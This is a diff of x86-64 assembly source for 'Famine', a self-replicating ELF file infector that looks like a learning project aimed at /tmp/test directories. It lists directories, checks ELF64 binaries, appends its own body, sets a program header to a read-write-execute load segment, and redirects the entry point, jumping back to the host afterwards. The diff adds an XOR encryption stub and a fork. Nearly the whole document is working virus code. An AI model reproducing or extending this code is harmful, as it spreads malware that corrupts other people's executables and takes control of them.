@@ -1,51 +1,74 @@
 %include "includes/header.s"
 
-global      _start                              ;must be declared for linker (ld)
-
-
-_host:
-	mov rax, _exit
-	syscall
-
+SECTION .TEXT EXEC WRITE
+global  _start                              ;must be declared for linker (ld)
 
 _start:   ;Entry-Point
-	push rdi
-	push rsi
-	push rcx
-	push rdx
-	push rbp
+PUSH
+;jmp .fork_quick
+xor r11, r11
+
+mov rdi, 0xAABBCCDD  ; key
+mov rax, .enc_start
+lea rdx, [rel .enc_start]
+mov rcx, enc_end
+sub rcx, rax
+.cypher:
+	mov r11b, byte [rdx]
+	xor r11, rdi
+	mov byte [rdx], r11b
+	inc rdx
+	loop .cypher
+
+xor r11, r11
+
+mov rdi, 0xAABBCCDD  ; key
+mov rax, .enc_start
+lea rdx, [rel .enc_start]
+mov rcx, enc_end
+sub rcx, rax
+.decypher:
+	mov r11b, byte [rdx]
+	xor r11, rdi
+	mov byte [rdx], r11b
+	inc rdx
+	loop .decypher
+
+.enc_start:
+.fork_quick:
+	mov rax, _fork
+	syscall
+	cmp rax, 0
+	POP
+	jne _exx
+
 	mov rbp, rsp
-	sub rbp, famine_size
+ 	sub rbp, famine_size  ; reserve famine_size bytes on the stack
 	
-	
-	lea rax, [rel _start]
-	mov rdx, [rel famine_entry]
-	sub rax, rdx
-	add rax, [rel host_entry]
-	push rax
-	lea rdi, [rel infect_dir]
+	lea rdi, [rel infect_dir] ; load dir str
 	
 .opendir:
 	mov r14, rdi
 	mov rsi, O_RDONLY | O_DIRECTORY
 	mov rax, _open
-	syscall
+	syscall				;	open directory
 	test eax, eax
 	jl .nextdir
-	mov STACK(famine.dir_fd), rax
+	mov STACK(famine.dir_fd), rax		; save dir_fd
 
 .readdir:
 	mov rdx, DIRENT_ARR_SIZE
 	lea rsi, STACK(famine.dirents)
 	mov rdi, STACK(famine.dir_fd)
 	mov rax, _getdents
-	syscall
+	syscall				;	get directory entries
 	test  rax,rax
-	jle .closedir
-	xor r13, r13
+	jle .closedir		;	no more entries
+	mov r13, 0
 	mov r12, rax
 
 .file:
+	; check directory entry for a regular file
 	lea rdi, STACK(famine.dirents)
 	add rdi, r13
 	movzx edx, word[rdi + dirent.d_reclen]
@@ -54,12 +77,12 @@ _start:   ;Entry-Point
 	add r13, rdx
 	cmp al, DT_REG
 	jne .nextfile
-	call process
+	call process		; process the file
 
 .nextfile:
-	cmp r13, r12
+	cmp r13, r12		; check if directory entry looping is over 
 	jl .file
-	jmp .readdir
+	jmp .readdir		; read dir for more entry
 
 .closedir:
 	mov rdi, STACK(famine.dir_fd)
@@ -67,47 +90,42 @@ _start:   ;Entry-Point
 	syscall
 
 .nextdir:
-	xor ecx, ecx
+	mov ecx, 0
 	mul ecx
 	dec ecx
 	mov rdi, r14
-	repnz scasb
+	repnz scasb		; next infect_dir
 	cmp byte[rdi], 0
 	jnz .opendir
-	pop rax
-	pop rbp
-	pop rdx
-	pop rcx
-	pop rsi
-	pop rdi
-	jmp _exx
+	POP		; restore register 
+	jmp _exx		;jump to the end
 
 process:
-	mov rsi, r14
+	mov rsi, r14  ; r14 hold infect dir
 	mov rax, rdi
-	lea rdi, STACK(famine.file_path)
+	lea rdi, STACK(famine.file_path)  ; load stack addr to store file_path
 	mov rdx, rdi
 
 .dirname:
-	movsb
+	movsb			; load dirname to rdi
 	cmp byte [rsi], 0
 	jnz .dirname
 	mov rsi, rax
 
 .filename:
-	movsb
+	movsb			; append filename to dirname to get full path
 	cmp byte[rsi - 1], 0
 	jnz .filename
 	mov rdi, rdx
 				;open file
 	mov rsi, O_RDWR
 	mov rax, _open
-	syscall
+	syscall			; open
 
 
 	test eax, eax
 	jl .return
-	mov STACK(famine.file_fd), rax
+	mov STACK(famine.file_fd), rax		; save result from open to stack
 
 				;stat
 	lea rsi, STACK(famine.stat)
@@ -116,22 +134,24 @@ process:
 	syscall
 	cmp rax, 0
 	jnz .close
-	mov rsi, qword STACK(famine.stat + stat.st_size)
-	mov STACK(famine.file_size), rsi
-	cmp rsi, elf64_ehdr_size + elf64_phdr_size + FAMINE_SIZE
+	mov rsi, qword STACK(famine.stat + stat.st_size)	; file size from stat to rsi
+	mov STACK(famine.file_size), rsi	; save file size to stack 
+	cmp rsi, elf64_ehdr_size + elf64_phdr_size + FAMINE_SIZE  ; check if size < ehdr_size + phdr size + famine_size
 	jl .close
 				;MMAP file
-	xor r9, r9
-	mov r8, STACK(famine.file_fd)
+	mov r9, 0
+	mov r8, STACK(famine.file_fd)  ; restore file_fd
 	mov r10, MAP_SHARED
 	mov rdx, PROT_READ | PROT_WRITE
 	xor rdi, rdi
 	mov rax, _mmap
 	syscall
+
 	cmp rax, MMAP_ERRORS
 	jae .close
-	mov STACK(famine.file_data), rax
-	mov rdi, rax
+	
+	mov STACK(famine.file_data), rax	; save mmap to file from rax to stack
+	mov rdi, rax						; 
 	call check_elf64
 	test al,al
 	jz .unmap
@@ -164,10 +184,10 @@ check_elf64:
 
 .continue:
 	mov rdx, _DYN_
-	cmp qword[rdi + 16], rdx
+	cmp qword[rdi + 16], rdx  ; DYN
 	jz .ok
 	mov rdx, _EXEC_
-	cmp qword[rdi + 16], rdx
+	cmp qword[rdi + 16], rdx	; EXEC
 	jnz .return
 .ok:
 	inc rax
@@ -175,15 +195,15 @@ check_elf64:
 	ret
 
 inject_self:
-	push r13
+	push r13		; save registers in case we need to restore 
 	push r14
 	push r15
-	mov r15, rdi
+	mov r15, rdi ; save phdr[0] offset to r15
 	mov rdx, qword [rdi + elf64_ehdr.e_entry]
 	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
 	mov rax, qword[rdi + elf64_ehdr.e_phoff]
 	add rdi,rax
-	mov r14, rdi
+	mov r14, rdi  ; save phdr[0] offset to r14
 
 	.segment:
 	cmp rcx, 0
@@ -195,13 +215,13 @@ inject_self:
 	jmp .infect
 
 	.next:
-	add rdi, elf64_phdr_size
-	dec rcx
+	add rdi, elf64_phdr_size  ; add phdr size to rdi to loop through pheaders
+	dec rcx					  ; decrement phnum
 	jmp .segment
 
 	.infect:
-	push rdi
-	mov rdx, r14
+	push rdi ; save phdr to infect offset to  stack
+
 ; get target End of file
 	mov rdi, STACK(famine.file_fd) ; target fd to rdi
 	mov rsi, 0 ; offset 0
@@ -221,7 +241,7 @@ inject_self:
 	lea rsi, [r13 + _start] ; load _start to rsi
 	mov rdx, _end - _start  ; virus size to rdx
 	mov r10, rax ; rax hold eof from lseek syscall 
-	mov rax, _write
+	mov rax, _pwrite
 	syscall
 	
 	cmp rax, 0
@@ -233,9 +253,10 @@ inject_self:
 	push rdi
 	push rax
 	mov dword [rdi], 1
-	mov eax, PF_R
-	or eax, PF_X
-	mov dword [rdi + 4], eax
+	mov eax, PF_R	; READ
+	or eax, PF_X	; EXEC
+	or eax, PF_W	; WRITE
+	mov dword [rdi + 4], eax   ;SET PERMS !
 	pop rax				; RAX = The offset of our injected V , (old EOF)
 	mov [rdi + 8], rax  ; set phdr.offset  = rax
 	mov r13, qword STACK(famine.stat + stat.st_size) ; load target size to r13
@@ -249,22 +270,22 @@ inject_self:
 	;	write it
 	mov rdi, STACK(famine.file_fd)
 	lea rsi, [rdi]
-	mov dx, 56
+	mov dx, PHDR_SIZE
 	mov r10, r14
-	mov rax, _write
+	mov rax, _pwrite
 	syscall
 
 	.edit_ehdr:
 	mov rdi, STACK(famine.file_data)
 	mov r14, [rdi + elf64_ehdr.e_entry ] ; save original e_entry to r14
-	mov [rdi + elf64_ehdr.e_entry], r13
+	mov [rdi + elf64_ehdr.e_entry], r13 ; set ehdr.e_entry to vaddr of injected
 	
 	;write it
 	mov rdi, STACK(famine.file_fd)
 	mov rsi, r15
-	mov rdx, 64
+	mov rdx, EHDR_SIZE				; 64 is size of EHDR
 	mov r10, 0
-	mov rax, _write
+	mov rax, _pwrite
 	syscall
 
 	.jmp_wuw:
@@ -287,26 +308,27 @@ inject_self:
 	mov rdi, STACK(famine.file_fd)
 	lea rsi, STACK(famine.jmp)
 	mov rdx, 5
-	sub rax, 14
+	sub rax, 14  ; offset between _end:  and jump .exit
 	mov r10, rax ; EOF From last call to lseek
-	mov rax, _write
+	mov rax, _pwrite
 	syscall
 
 	mov rax, _sync
 	syscall
 	.return :
-		pop r15
+		pop r15		; restore saved registers
 		pop r14
 		pop r13
 		ret
 
 infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
+enc_end:
+	db 0
 signature		db			'Famine version 99.0 (c)oded by <araout>', 0xa
 famine_entry	dq			_start
-host_entry		dq			_host
 
 _exx:
-jmp .exit
+jmp .exit	; at source execution of famine this will exit. when written to target jump is edited to host entry
 	.exit:
 		mov rax, _exit
 		mov rdi, 0
